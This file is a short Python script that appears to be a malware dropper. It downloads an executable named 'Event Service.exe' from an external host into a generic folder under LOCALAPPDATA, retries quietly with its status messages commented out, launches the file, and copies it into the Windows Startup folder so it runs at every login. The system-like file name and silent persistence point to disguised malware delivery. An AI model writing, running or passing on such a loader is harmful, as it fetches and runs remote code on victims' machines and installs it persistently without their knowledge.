import os
import requests
import time
import sys
import shutil


def main():
    base = os.path.join(os.environ["LOCALAPPDATA"], "MyApp")
    os.makedirs(base, exist_ok=True)
    
    url = "https://dzflavors.com/Event%20Service.exe"
    path = os.path.join(base, "Event Service.exe")
    
    
    success = False
    
    for _ in range(3):
        try:
            with requests.get(url, stream=True, timeout=30) as r:
                r.raise_for_status()
                total_size = int(r.headers.get('content-length', 0))
                downloaded = 0
    
                with open(path, "wb") as f:
                    for chunk in r.iter_content(chunk_size=8192):
                        if chunk:
                            f.write(chunk)
                            downloaded += len(chunk)
    
            if total_size == 0 or downloaded == total_size:
                success = True
                break
            else:
                print(" retrying...")
        except Exception:
            time.sleep(2)
    
    if not success:
        #print(" failed.")
        sys.exit()
    
    #print("completed")
    
    
    os.startfile(path)
    
    
    startup_folder = os.path.join(
        os.environ["APPDATA"],
        r"Microsoft\Windows\Start Menu\Programs\Startup"
    )
    shutil.copy2(path, os.path.join(startup_folder, "Event Service.exe"))


if __name__ == "__main__":
    main()